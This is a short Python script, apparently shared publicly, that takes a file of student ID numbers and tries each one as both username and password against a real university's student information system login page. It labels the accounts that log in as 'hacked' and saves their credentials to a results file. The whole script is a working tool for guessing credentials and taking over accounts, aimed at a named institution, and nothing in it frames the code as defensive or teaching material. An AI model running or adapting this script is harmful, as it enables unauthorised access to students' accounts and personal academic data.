# Coded by: YutixCode
# Remember my Name!
# https://njnk.my.id/

import os
try:
	import requests as req
	import requests.packages.urllib3
	from bs4 import BeautifulSoup as Bs
	requests.packages.urllib3.disable_warnings()
except ModuleNotFoundError:
	os.system('python -m pip install --upgrade pip')
	os.system('pip install requests bs4')
	exit('\nSilahkan jalankan ulang Script nya.')

def start(file):
	try:
		# Membuka filepath
		with open(file, 'r') as file:
			hitung  = 0
			failed  = []
			success = []
			barisan = file.readlines()
			for baris in barisan:
				hitung +=1
				
				# Melakukan login dan menampikan output
				xhost = 'https://siak.upi.edu/sias/Logout.aspx'
				xdata = { 'user_id': baris.strip(), 'password': baris.strip() }
				hasil = req.post(xhost, data=xdata, verify=False)
				title = Bs(hasil.text, 'html.parser').find('title')
				
				# Menentukan berhasil atau gagal
				if title.text == 'SIAS>Login':
					print(f'\033[37m{hitung}) \33[1;33m{baris.strip()} | {baris.strip()} - Nim Diretas')
					success.append(f'{baris.strip()}')
				else:
					print(f'\033[37m{hitung}) \033[31m{baris.strip()} | {baris.strip()} - Kurang Tampan')
					failed.append(f'{baris.strip()}')
			
			# Menghitung data akun yg berhasil login
			totalsukses = 0
			for i in success:
				totalsukses +=1
			print(f'\n\33[1;33m -> Sukses: \033[92m{totalsukses}')
			
			# Menghitung data akun yg gagal saat login
			totalgagal = 0
			for i in failed:
				totalgagal +=1
			print(f'\033[37m -> Failed: \033[91m{totalgagal}\033[37m\n')
			
			# Menampilkan data akun yg berhasil login
			hitung = 0
			print('Data akun Sukses:')
			for i in success:
				hitung += 1
				print(f'\33[1;33m {hitung}) UserID: \33[1;33m{i} \033[37m| Password: \33[1;33m{i}')
				
				# Menyimpan data sukses ke sebuah file
				with open(f'hasil.txt', 'a') as hasil:
					hasil.write(f'UserID: {i} | Password: {i}\n')
					hasil.close()
			exit("\033[37m\nData tersimpan di \033[96m'hasil.txt'")
		
	except FileNotFoundError:
		exit('\033[91mMaaf, file tidak ditemukan :(')

def main():
	print('Assyifah Latief\33[1;33m\n-------')
	file = input('Filepath: ')
	start(file)

if __name__ == '__main__':
	main()